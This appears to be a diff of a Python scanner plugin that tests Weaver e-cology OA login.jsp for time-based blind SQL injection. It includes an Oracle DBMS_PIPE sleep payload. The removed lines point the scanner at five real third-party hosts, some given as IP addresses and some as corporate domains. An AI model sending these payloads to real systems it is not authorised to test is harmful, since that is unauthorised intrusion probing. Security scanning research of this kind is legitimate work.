@@ -19,10 +19,11 @@ def audit(arg):
     t1 = time.time()
     code1, head1, res1, errcode1, _1 = curl.curl2(arg+payload1)
     t2 = time.time()
-    code2, head2, res2, errcode2, _2 = curl.curl2(arg+payload2) 
+    code2, head2, res2, errcode2, _2 = curl.curl2(arg+payload2)
     t3 = time.time()
     if (t2 - t1 - t3 + t2 > 3):
         security_hole(_1+' has injection(MSSQL)')
+        return arg
     #Oracle
     else:
         payload1 = "wui/theme/ecology7/page/login.jsp?templateId=1'%20AND%206120=DBMS_PIPE.RECEIVE_MESSAGE(CHR(68)||CHR(102)||CHR(119)||CHR(86),5)%20AND%20'bcBY'='bcBY"
@@ -30,15 +31,12 @@ def audit(arg):
         t1 = time.time()
         code1, head1, res1, errcode1, _1 = curl.curl2(arg+payload1)
         t2 = time.time()
-        code2, head2, res2, errcode2, _2 = curl.curl2(arg+payload2) 
+        code2, head2, res2, errcode2, _2 = curl.curl2(arg+payload2)
         t3 = time.time()
         if (t2 - t1 - t3 + t2 > 3):
             security_hole(_1+' has injection(Oracle)')
 
-if __name__ == '__main__':
+
+            return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('weaver_e-cology', 'http://59.49.15.130:82/')[1])
-    audit(assign('weaver_e-cology', 'http://58.62.113.250:8088/')[1])
-    audit(assign('weaver_e-cology', 'http://oa.fosun.com/')[1])
-    audit(assign('weaver_e-cology', 'http://oa.baixiangfood.com/')[1])
-    audit(assign('weaver_e-cology', 'http://oa.hbxx.com.cn/')[1])
